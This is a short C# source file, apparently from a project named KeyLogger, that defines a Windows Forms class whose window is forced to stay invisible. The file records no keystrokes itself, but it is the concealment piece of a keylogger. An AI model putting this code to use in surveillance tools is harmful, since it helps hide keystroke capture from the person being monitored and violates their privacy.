using System.Windows.Forms;
using KeyLogger.Enums;
using static KeyLogger.WinApis.User32;

namespace KeyLogger.Forms
{
	public class HiddenForm : Form
	{
		public int KeyId { get; set; }



		protected override void SetVisibleCore(bool value)
		{
			base.SetVisibleCore(false);
		}
	}
}
